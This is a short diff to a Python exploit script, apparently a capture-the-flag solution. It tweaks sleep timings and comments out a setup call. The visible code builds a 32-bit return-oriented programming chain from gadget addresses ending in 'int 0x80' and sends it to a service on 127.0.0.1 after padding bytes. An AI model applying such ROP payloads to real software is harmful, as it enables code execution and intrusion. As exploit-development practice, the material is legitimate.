@@ -26,7 +26,7 @@ def send_cmd(cmd):
                                     ('127.0.0.1', 0))
 
     sock.sendall("a"*1020)
-    time.sleep(1)
+    time.sleep(2)
     sock.sendall(cmd+"\r\n")
 
     while True:
@@ -36,7 +36,7 @@ def send_cmd(cmd):
         sys.stdout.write(buf)
     sock.close()
 
-orig_send_cmd("PUT SECRET p455w0rd! Secret Value\r\n")
+#orig_send_cmd("PUT SECRET p455w0rd! Secret Value\r\n")
 
 p = ''
 p += pack('<I', 0x080f1016) # pop eax ; ret
@@ -123,5 +123,6 @@ p += pack('<I', 0x08085cbf) # int 0x80
 c = 'w'
 i = 32
 send_cmd(c*i+p)
+time.sleep(2)
 
 # :vim set sw=4 ts=8 sts=8 expandtab:
